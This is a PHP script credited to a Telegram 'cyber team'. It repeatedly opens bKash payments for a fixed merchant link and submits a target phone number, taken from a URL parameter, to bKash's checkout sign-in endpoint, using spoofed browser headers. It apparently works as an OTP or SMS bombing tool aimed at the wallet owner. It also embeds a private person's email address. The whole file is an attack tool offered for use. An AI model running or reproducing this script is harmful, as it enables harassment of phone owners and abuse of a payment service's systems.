#_____DAVLOPER :_ KALYAN KING ✔
#_______ TELIGERM : KGF CYBER TEAM ✔
#_____ LINK : https://t.me/+e5Rr0q5ixnxlNTNl
<?php

for ($i = 1; $i <= 999999999999999999999999; $i++) {
    $number = "number" . $i;
    
$number = $_GET["number"];

    $data_first = array(
        'intent' => 'sale',
        'basePath' => 'nazrul-mobile-shop01614849817',
        'urlFragment' => 'pay/bdt30/DkW1Sy',
        'trxType' => 'AMOUNT',
        'amount' => '30',
        'price' => '30',
        'references' => array(
            array(
                'fieldName' => 'Email',
                'fieldType' => 'EMAIL',
                'required' => false,
                'value' => 'armanhasansanto@gmail.com'
            )
        ),
        'sourceType' => 'payment-link',
        'useWalletAsContact' => true
    );

    $data_json_first = json_encode($data_first);

    $headers_first = array(
        'Host: cpp.bka.sh',
        'Content-Length: ' . strlen($data_json_first),
        'Content-Type: application/json',
        'Accept: application/json, text/plain, */*',
        'Origin: https://shop.bkash.com',
        'Referer: https://shop.bkash.com/',
        'User-Agent: Mozilla/5.0 (Linux; Android 13; 21121119SG Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.165 Mobile Safari/537.36',
        'Sec-Ch-UA: "Not A(Brand";v="99", "Android WebView";v="121", "Chromium";v="121"',
        'Sec-Ch-UA-Mobile: ?1',
        'Sec-Ch-UA-Platform: "Android"',
        'Sec-Fetch-Site: cross-site',
        'Sec-Fetch-Mode: cors',
        'Sec-Fetch-Dest: empty',
        'X-User-Ip-Address: 37.111.206.57',
        'X-Requested-With: mark.via.gp',
        'Accept-Encoding: gzip, deflate, br',
        'Accept-Language: en-GB,en-US;q=0.9,en;q=0.8'
    );

    $ch_first = curl_init();
    curl_setopt($ch_first, CURLOPT_URL, 'https://cpp.bka.sh/customer-portal-middleware/create-payment');
    curl_setopt($ch_first, CURLOPT_HTTP_VERSION, CURL_HTTP_VERSION_2_0);
    curl_setopt($ch_first, CURLOPT_POST, true);
    curl_setopt($ch_first, CURLOPT_POSTFIELDS, $data_json_first);
    curl_setopt($ch_first, CURLOPT_HTTPHEADER, $headers_first);
    curl_setopt($ch_first, CURLOPT_RETURNTRANSFER, true);
    $response_first = curl_exec($ch_first);
    curl_close($ch_first);

    if ($response_first === false) {
        echo 'cURL error: ' . curl_error($ch_first);
    } else {
        $response_first_array = json_decode($response_first, true);
        if (isset($response_first_array['paymentID'])) {
            
            $data_second = array(
                'wallet' => $number, // Removed single quotes around $number
                'paymentID' => $response_first_array['paymentID'],
                'apiVersion' => 'v1.2.0-beta'
            );

            $data_json_second = json_encode($data_second);

            $headers_second = array(
                'Host: checkoutbg.pay.bka.sh',
                'Content-Length: ' . strlen($data_json_second),
                'Sec-Ch-UA: "Not A(Brand";v="99", "Android WebView";v="121", "Chromium";v="121"',
                'Accept: */*',
                'Content-Type: application/json',
                'Sec-Ch-UA-Mobile: ?1',
                'User-Agent: Mozilla/5.0 (Linux; Android 13; 21121119SG Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.165 Mobile Safari/537.36',
                'Sec-Ch-UA-Platform: "Android"',
                'Origin: https://client.pay.bka.sh',
                'X-Requested-With: mark.via.gp',
                'Sec-Fetch-Site: same-site',
                'Sec-Fetch-Mode: cors',
                'Sec-Fetch-Dest: empty',
                'Referer: https://client.pay.bka.sh/checkout/2',
                'Accept-Encoding: gzip, deflate, br',
                'Accept-Language: en-GB,en-US;q=0.9,en;q=0.8'
            );

            $ch_second = curl_init();
            curl_setopt($ch_second, CURLOPT_URL, 'https://checkoutbg.pay.bka.sh/signInCheckout');
            curl_setopt($ch_second, CURLOPT_HTTP_VERSION, CURL_HTTP_VERSION_2_0);
            curl_setopt($ch_second, CURLOPT_POST, true);
            curl_setopt($ch_second, CURLOPT_POSTFIELDS, $data_json_second);
            curl_setopt($ch_second, CURLOPT_HTTPHEADER, $headers_second);
            curl_setopt($ch_second, CURLOPT_RETURNTRANSFER, true);
            $response_second = curl_exec($ch_second);
            curl_close($ch_second);

            if ($response_second === false) {
                echo 'cURL error: ' . curl_error($ch_second);
            } else {
                echo $response_second;
            }
        } else {
            echo 'Payment ID not found in the response.';
        }
    }
    echo "Processed number: $number <br>"; 

}

?>
